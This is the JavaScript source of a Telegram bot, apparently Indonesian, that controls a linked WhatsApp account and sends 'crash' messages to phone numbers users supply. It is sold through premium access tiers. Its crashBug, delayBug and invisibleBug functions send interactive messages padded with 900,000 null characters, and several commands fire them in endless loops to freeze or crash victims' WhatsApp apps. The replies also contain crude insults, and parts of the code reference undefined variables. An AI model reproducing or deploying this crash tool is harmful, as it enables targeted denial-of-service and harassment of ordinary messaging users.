const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");

const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const axios = require("axios");
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const adminFile = './adminuser.json';
let bots = [];
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

let Sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const randomImages = [
    "https://files.catbox.moe/o3isis.jpg",
    "https://files.catbox.moe/60y8u2.jpg",
    "https://files.catbox.moe/6di1zv.jpg",
    "https://files.catbox.moe/m3zub6.jpg"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

function getPushName(ctx) {
  return ctx.from.first_name || "Pengguna";
}

const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Command ini Khusus Pemilik Bot");
    }
    next();
};

const checkAdmin = (ctx, next) => {
    if (!adminUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin");
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan pengguna premium.");
    }
    next();
};

const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

const saveAdmins = () => {
    fs.writeFileSync('./admins.json', JSON.stringify(adminList));
};

const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

const addPremiumUser = (userId, durationDays) => {
    const expirationDate = moment().tz('Asia/Jakarta').add(durationDays, 'days');
    premiumUsers[userId] = {
        expired: expirationDate.format('YYYY-MM-DD HH:mm:ss')
    };
    savePremiumUsers();
};

const removePremiumUser = (userId) => {
    delete premiumUsers[userId];
    savePremiumUsers();
};

const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "❌";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "✅";
        return true;
    } else {
        Premiumataubukan = "❌";
        return false;
    }
};

const savePremiumUsers = () => {
    fs.writeFileSync('./premiumUsers.json', JSON.stringify(premiumUsers));
};

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync('./premiumUsers.json');
        premiumUsers = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat data user premium:'), error);
        premiumUsers = {};
    }
};

const loadDeviceList = () => {
    try {
        const data = fs.readFileSync('./ListDevice.json');
        deviceList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar device:'), error);
        deviceList = [];
    }
};

//~~~~~~~~~~~~ [ START ] ~~~~~~~~~~~~~\\

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply(`Whatsapp Belum Terhubung`);
        return;
    }
    next();
};

async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomImage(),
        caption,
        parse_mode: 'Markdown',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error edit menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}


bot.command('start', async (ctx) => {
    const yatem = getUptime();
    const bokep = getRandomImage();
    
    const senderName = ctx.from.first_name
        ? `User: ${ctx.from.first_name}`
        : `User ID: ${ctx.from.id}`;

    const makLu = isWhatsAppConnected
        ? "𝐂𝐨𝐧𝐧𝐞𝐜𝐭"
        : "𝐃𝐢𝐬𝐜𝐨𝐧𝐧𝐞𝐜𝐭";


    await ctx.replyWithPhoto(bokep, {
        caption: `\`\`\`
[ 🐉 ] olá ${senderName} привет я бот 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝘂𝗴🦠 Меня создал разработчик Дани. Наслаждайтесь использованием этого скрипта 

◈──── [ 𝐈 𝐍 𝐅 𝐎 — 𝐁 𝐎 𝐓 ] ────◈
╰─➤ 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : 𝐗 𝐒𝐓𝐀𝐑𝐓 𝐅𝐑𝐎𝐌
╰─➤ 𝐁𝐨𝐭 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏.𝟎
╰─➤ 𝐓𝐲𝐩𝐞 : 𝐁𝐮𝐭𝐭𝐨𝐧
╰─➤ 𝐋𝐚𝐧𝐠𝐮𝐚𝐠𝐞 : 𝐉𝐚𝐯𝐚𝐒𝐜𝐫𝐢𝐩𝐭
╰─➤ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${yatem}
╰─➤ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 : ${makLu}
◈──── [ 𝐅 𝐈 𝐍 𝐀 𝐋 ] ────◈
\`\`\`
©𝐃𝐚𝐧𝐳 𝐍𝐞𝐰 𝐄𝐫𝐚`,
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [
                Markup.button.callback('𝐁͢𝐮͡𝐠𝐌͜𝐞͢𝐧͡𝐮', 'bug'),
                Markup.button.callback('𝐎͢𝐰͡𝐧͜𝐞͢𝐫𝐌͜𝐞͢𝐧͡𝐮', 'owner'),
            ],
            [
                Markup.button.url('⌜ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⌟', 'https://t.me/danzxbokeff'),
                Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://t.me/danzvuckyou'),
            ]
        ])
    });
});

bot.action('bug', async (ctx) => {
    const yatem = getUptime();
    const bokep = getRandomImage();
    
    const senderName = ctx.from.first_name
        ? `User: ${ctx.from.first_name}`
        : `User ID: ${ctx.from.id}`;

    const makLu = isWhatsAppConnected
        ? "𝐂𝐨𝐧𝐧𝐞𝐜𝐭"
        : "𝐃𝐢𝐬𝐜𝐨𝐧𝐧𝐞𝐜𝐭";
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝙱𝙰𝙲𝙺', 'startback')],
  ]);

  const caption = `\`\`\`
[ 🐉 ] olá ${senderName} привет я бот 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝘂𝗴🦠 Меня создал разработчик Дани. Наслаждайтесь использованием этого скрипта 

◈────── [ 𝐈 𝐍 𝐅 𝐎 — 𝐁 𝐎 𝐓 ] ──────◈
╰─➤ 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : 𝐗 𝐒𝐓𝐀𝐑𝐓 𝐅𝐑𝐎𝐌
╰─➤ 𝐁𝐨𝐭 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏.𝟎
╰─➤ 𝐓𝐲𝐩𝐞 : 𝐁𝐮𝐭𝐭𝐨𝐧
╰─➤ 𝐋𝐚𝐧𝐠𝐮𝐚𝐠𝐞 : 𝐉𝐚𝐯𝐚𝐒𝐜𝐫𝐢𝐩𝐭
╰─➤ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${yatem}
╰─➤ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 : ${makLu}
◈─────────────────────────────◈
╭──────[ 𝐁 𝐔 𝐆 — 𝐌 𝐄 𝐍 𝐔 ]───────◈
│➵ /ᴅᴇʟᴀʏɪɴᴠɪs <62×××>
│╰┈➤ ᴅᴇʟᴀʏ ɪɴᴠɪsɪʙʟᴇ
│
│
│➵ /xᴅᴇʟᴀʏʜᴀʀᴅ <62×××>
│╰┈➤ ᴅᴇʟᴀʏ ʜᴀʀᴅ
│
╰─────────────────────────────◈
\`\`\`
©𝐒𝐚𝐥𝐥 𝐍𝐞𝐰 𝐄𝐫𝐚`;

  await editMenu(ctx, caption, buttons);
});

bot.action('owner', async (ctx) => {
    const yatem = getUptime();
    const bokep = getRandomImage();
    
    const senderName = ctx.from.first_name
        ? `User: ${ctx.from.first_name}`
        : `User ID: ${ctx.from.id}`;

    const makLu = isWhatsAppConnected
        ? "𝐂𝐨𝐧𝐧𝐞𝐜𝐭"
        : "𝐃𝐢𝐬𝐜𝐨𝐧𝐧𝐞𝐜𝐭";

  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('𝙱𝙰𝙲𝙺', 'startback')],
  ]);

  const caption = `\`\`\`
[ 🐉 ] olá ${senderName} привет я бот 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝘂𝗴🦠 Меня создал разработчик Дани. Наслаждайтесь использованием этого скрипта 

◈────── [ 𝐈 𝐍 𝐅 𝐎 — 𝐁 𝐎 𝐓 ] ──────◈
╰─➤ 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : 𝐗 𝐒𝐓𝐀𝐑𝐓 𝐅𝐑𝐎𝐌
╰─➤ 𝐁𝐨𝐭 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏.𝟎
╰─➤ 𝐓𝐲𝐩𝐞 : 𝐁𝐮𝐭𝐭𝐨𝐧
╰─➤ 𝐋𝐚𝐧𝐠𝐮𝐚𝐠𝐞 : 𝐉𝐚𝐯𝐚𝐒𝐜𝐫𝐢𝐩𝐭
╰─➤ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${yatem}
╰─➤ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 : ${makLu}
◈─────────────────────────────◈
╭──────[ 𝐎 𝐖 𝐍 𝐄 𝐑 — 𝐌 𝐄 𝐍 𝐔 ]──────◈
│➵ /ᴀᴅᴅᴘʀᴇᴍ <ɪᴅ>
│╰┈➤ ᴀᴅᴅ ᴀᴄᴄᴇs ʙᴜɢ
│
│➵ /ᴅᴇʟᴘʀᴇᴍ <ɪᴅ>
│╰┈➤ ᴅᴇʟ ᴀᴄᴄᴇs ʙᴜɢ
│
│➵ /ᴄᴇᴋᴘʀᴇᴍ 
│╰┈➤ ᴄᴇᴋ ʏᴏᴜʀ sᴛᴀᴛᴜs ᴘʀᴇᴍ
│
│➵ /ᴀᴅᴅᴀᴅᴍɪɴ
│╰┈➤ ᴀᴅᴅ ᴀᴄᴄᴇs ᴀᴅᴅᴘʀᴇᴍ & ᴀᴄᴄᴇs ʙᴜɢ
│
│➵ /ᴅᴇʟᴀᴅᴍɪɴ
│╰┈➤ ᴅᴇʟ ᴀᴄᴄᴇs ᴀᴅᴅᴘʀᴇᴍ & ᴀᴄᴄᴇs ʙᴜɢ
│
│➵ /ᴄᴏɴɴᴇᴄᴛ <62xxx>
│╰┈➤ ᴄᴏɴɴᴇᴄᴛ ᴛᴏ ᴡʜᴀᴛsᴀᴘᴘ
╰────────────────────────────────◈
\`\`\`
©𝐒𝐚𝐥𝐥 𝐍𝐞𝐰 𝐄𝐫𝐚`;

  await editMenu(ctx, caption, buttons);
});

bot.action('startback', async (ctx) => {
    const yatem = getUptime();
    const bokep = getRandomImage();
    
    const senderName = ctx.from.first_name
        ? `User: ${ctx.from.first_name}`
        : `User ID: ${ctx.from.id}`;

    const makLu = isWhatsAppConnected
        ? "𝐂𝐨𝐧𝐧𝐞𝐜𝐭"
        : "𝐃𝐢𝐬𝐜𝐨𝐧𝐧𝐞𝐜𝐭";
    
  const buttons = Markup.inlineKeyboard([
         [
             Markup.button.callback('𝐁͢𝐮͡𝐠𝐌͜𝐞͢𝐧͡𝐮', 'bug'),
             Markup.button.callback('𝐎͢𝐰͡𝐧͜𝐞͢𝐫𝐌͜𝐞͢𝐧͡𝐮', 'owner'),
         ],
         [
             Markup.button.url('⌜ 𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽 ⌟', 'https://t.me/danzxbokeff'),
             Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://t.me/danzvuckyou'),
         ]
]);

  const caption = `\`\`\`
[ 🐉 ] olá ${senderName} привет я бот 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 - 𝗕𝘂𝗴🦠 Меня создал разработчик Дани. Наслаждайтесь использованием этого скрипта 

◈──── [ 𝐈 𝐍 𝐅 𝐎 — 𝐁 𝐎 𝐓 ] ────◈
╰─➤ 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : 𝐗 𝐒𝐓𝐀𝐑𝐓 𝐅𝐑𝐎𝐌
╰─➤ 𝐁𝐨𝐭 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : 𝟏.𝟎
╰─➤ 𝐓𝐲𝐩𝐞 : 𝐁𝐮𝐭𝐭𝐨𝐧
╰─➤ 𝐋𝐚𝐧𝐠𝐮𝐚𝐠𝐞 : 𝐉𝐚𝐯𝐚𝐒𝐜𝐫𝐢𝐩𝐭
╰─➤ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : ${yatem}
╰─➤ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩 : ${makLu}
◈──── [ 𝐅 𝐈 𝐍 𝐀 𝐋 ] ────◈
\`\`\`
©𝐃𝐚𝐧𝐳 𝐍𝐞𝐰 𝐄𝐫𝐚`;

  await editMenu(ctx, caption, buttons);
});

//~~~~~~~~~~~~~~~~~~END~~~~~~~~~~~~~~~~~~~~\\

const donerespone = (target, ctx) => {
    const bokep = getRandomImage();
    const senderName = ctx.message.from.first_name || ctx.message.from.username || "Pengguna"; // Mengambil nama peminta dari konteks
    
     ctx.replyWithPhoto(bokep, {
    caption: `
┏━━━━━[ 𝐗 𝐒𝐓𝐀𝐑𝐓 — 𝐅 𝐑 𝐎 𝐌 ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗦𝘂𝗸𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${SockNumber}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
`,
         parse_mode: 'Markdown',
                  ...Markup.inlineKeyboard([
                    [
                       Markup.button.callback('𝙱𝙰𝙲𝙺', 'start'),
                       Markup.button.url('⌜ 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 ⌟', 'https://t.me/salldisinicuy'),
                    ]
                 ])
              });
              (async () => {
    console.clear();
    console.log(chalk.black(chalk.bgGreen('Succes Send Bug By Salll')));
    })();
}

bot.command("delayinvis", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/delayinvis 628xxxx`);
    }

    let SockNumber = q.replace(/[^0-9]/g, '');

    let target = SockNumber + "@s.whatsapp.net";

    let ProsesSock = await ctx.reply(`Successfully✅`);

    while (true) {
      await invisibleBug(target, true)
      await delayBug(target, true) 
      await crashBug(target, true) 
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesSock.message_id,
        undefined, `
┏━━━━━[ 𝐗 𝐒𝐓𝐀𝐑𝐓 — 𝐅 𝐑 𝐎 𝐌 ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${SockNumber}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
   await donerespone(target, ctx);
});

bot.command("crashui", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/attackui 628xxxx`);
    }

    let SockNumber = q.replace(/[^0-9]/g, '');

    let target = SockNumber + "@s.whatsapp.net";

    let ProsesSock = await ctx.reply(`Successfully✅`);

    while (true) {
      await invisibleBug(target, true)
      await delayBug(target, true) 
      await crashBug(target, true) 
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesSock.message_id,
        undefined, `
┏━━━━━[ 𝐃 𝐀 𝐍 𝐙 — 𝐁 𝐀 𝐒 𝐄 ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${SockNumber}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
   await donerespone(target, ctx);
});


bot.command("combo", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`Example:\n\n/combo 628xxxx`);
    }

    let SockNumber = q.replace(/[^0-9]/g, '');

    let target = SockNumber + "@s.whatsapp.net";

    let ProsesSock = await ctx.reply(`Successfully✅`);

    while (true) {
      await invisibleBug(target, true)
      await delayBug(target, true) 
      await crashBug(target, true) 
      await invisibleBug(target, true)
      await delayBug(target, true) 
      await crashBug(target, true) 
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesSock.message_id,
        undefined, `
┏━━━━━[ 𝐃 𝐀 𝐍 𝐙 — 𝐁 𝐀 𝐒 𝐄 ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${SockNumber}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
   await donerespone(target, ctx);
});

bot.command("crashios", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;
  
    if (!q) {
        return ctx.reply(`Example:\n\n/delayui 628xxxx`);
    }

    let SockNumber = q.replace(/[^0-9]/g, '');

    let target = SockNumber + "@s.whatsapp.net";

    let ProsesSock = await ctx.reply(`Successfully✅`);

    for (let i = 0; i < 30; i++) {
      await invisibleBug(target)
      await delayBug(target) 
      await crashBug(target) 
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        ProsesSock.message_id,
        undefined, `
┏━━━━━[ 𝐗 𝐒𝐓𝐀𝐑𝐓 — 𝐅 𝐑 𝐎 𝐌 ]━━━━━┓
┃ 𝗦𝘁𝗮𝘁𝘂𝘀 : 𝗣𝗿𝗼𝘀𝗲𝘀 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴
┃ 𝗧𝗮𝗿𝗴𝗲𝘁 : ${SockNumber}
┃ 𝗡𝗼𝘁𝗲 : 𝗝𝗲𝗱𝗮 𝟭𝟬 𝗠𝗲𝗻𝗶𝘁! 
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`);
   await donerespone(target, ctx);
});

//~~~~~~~~~~~~~~~~~~~~~~ [ END CASE BUG ]~~~~~~~~~~~~~~~~~~~\\
bot.command('addprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 7112830272");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ si ngentot ${userId} sudah memiliki status premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🥳 Done add ya ${userId} sekarang memiliki akses premium!`);
});

bot.command('addadmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 7112830272");
    }

    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ Done admin ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 si kontol ${userId} sekarang memiliki akses Admin!`);
});

bot.command('delprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 7112830272");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ si anjing ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 si babi ${userId} telah dihapus dari daftar premium.`);
});

bot.command('deladmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 7112830272");
    }

    const userId = args[1];

    if (!adminUsers.includes(userId)) {
        return ctx.reply(`❌ si anjing ${userId} tidak ada dalam daftar Admin.`);
    }

    adminUsers = adminUsers.filter(id => id !== userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🚫 si babi ${userId} telah dihapus dari daftar Admin.`);
});

bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Kamu Pengguna Premium`);
    } else {
        return ctx.reply(`❌ Kamu Tidak Premium`);
    }
});

bot.command("connect", checkOwner, async (ctx) => {
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("Example : 62xxx. Note : Tidak Support Whatsapp Bisnis");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');

    if (Sock && Sock.user) {
        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await Sock.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
\`\`\`┏━━━━━[ 𝐃 𝐀 𝐍 𝐙 — 𝐁 𝐀 𝐒 𝐄 ]━━━━━┓
┃ 𝗬𝗼𝘂𝗿 𝗡𝘂𝗺𝗯𝗲𝗿 : ${phoneNumber}
┃ 𝗖𝗼𝗱𝗲 : ${formattedCode}
┃ 𝗡𝗼𝘁𝗲 : 𝗪𝗮𝗸𝘁𝘂 𝗣𝗮𝗶𝗿𝗶𝗻𝗴 𝗖𝘂𝗺𝗮𝗻 𝟭 𝗠𝗲𝗻𝗶𝘁
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\`\`\`
`;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { 
      pm2.disconnect(); 
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};

//~~~~~~~~~~~~~~~~~~~ [ FUNC BUG ]~~~~~~~~~~~~~~~~~~~\\
async function crashBug(target) {
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  await Sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              subtitle: "\u0000".repeat(900000),
              title: "⚡️ Crash Bug Triggered ⚡️",
              locationMessage: {},
              hasMediaAttachment: false,
            },
            body: {
              text: "⚡️ Application Crashed ⚡️",
            },
            nativeFlowMessage: {
              messageParamsJson: "⚡️ Application Crashed ⚡️",
            },
            carouselMessage: {},
          },
        },
      },
    },
    {}
  );

  await delay(2000);

  await Sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              subtitle: "\u0000".repeat(900000),
              title: "⚡️ Crash Bug Triggered ⚡️",
              locationMessage: {},
              hasMediaAttachment: false,
            },
            body: {
              text: "⚡️ Application Crashed ⚡️",
            },
            nativeFlowMessage: {
              messageParamsJson: "⚡️ Application Crashed ⚡️",
            },
            carouselMessage: {},
          },
        },
      },
    },
    {}
  );
}

// #2
async function delayBug(target) {
  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  await delay(5000);

  await Sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              subtitle: "\u0000".repeat(900000),
              title: "⏳ Delay Bug Triggered ⏳",
              locationMessage: {},
              hasMediaAttachment: false,
            },
            body: {
              text: "⏳ Delay Triggered for 5 seconds ⏳",
            },
            nativeFlowMessage: {
              messageParamsJson: "⏳ Delay Triggered for 5 seconds ⏳",
            },
            carouselMessage: {},
          },
        },
      },
    },
    {}
  );
}

// #3
async function invisibleBug(target) {
  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

  await Sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              subtitle: "\u0000".repeat(900000),
              title: "👻 Invisible Bug Triggered 👻",
              locationMessage: {},
              hasMediaAttachment: false,
            },
            body: {
              text: "👻 Invisible Bug Triggered (Message Hidden) 👻",
            },
            nativeFlowMessage: {
              messageParamsJson: "👻 Invisible Bug Triggered (Message Hidden) 👻",
            },
            carouselMessage: {},
          },
        },
      },
    },
    {}
  );

  await delay(2000);

  await Sock.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              subtitle: "\u0000".repeat(900000),
              title: "👻 Invisible Bug Triggered 👻",
              locationMessage: {},
              hasMediaAttachment: false,
            },
            body: {
              text: "👻 Invisible Bug Triggered (Message Hidden) 👻",
            },
            nativeFlowMessage: {
              messageParamsJson: "👻 Invisible Bug Triggered (Message Hidden) 👻",
            },
            carouselMessage: {},
          },
        },
      },
    },
    {}
  );
}
//~~~~~~~~~~~~~~~~~~~ [ FINAL FUNC BUG ]~~~~~~~~~~~~~~~~~~~\\

// ------------ [ START SESI ] -----------------
const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), 
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', 
        }),
    };

    Sock = makeWASocket(connectionOptions);

    Sock.ev.on('creds.update', saveCreds);

    Sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃  ${chalk.green.bold('WHATSAPP ')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('✅WHATSAPP BERHASIL TERSAMBUNG✅')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`),
                shouldReconnect ? chalk.white.bold(`
╭━━━━━━━━━━━━━━━━━━━━━━❍
┃ ${chalk.red.bold('RECONNECTING AGAIN')}
╰━━━━━━━━━━━━━━━━━━━━━━❍`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

// ---------- [ CHEK TOKEN ] --------------
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/repoOwner/repoName/main/File.json";

async function fetchValidTokens() {
    try {
        const response = await axios.get(GITHUB_TOKEN_LIST_URL);
        return response.data; 
    } catch (error) {
        console.error(chalk.red("Gagal mengambil token database di GitHub!"), error.message);
        return [];
    }
}
async function validateToken() {
    console.log(chalk.blue("Loading Check Token Bot..."));
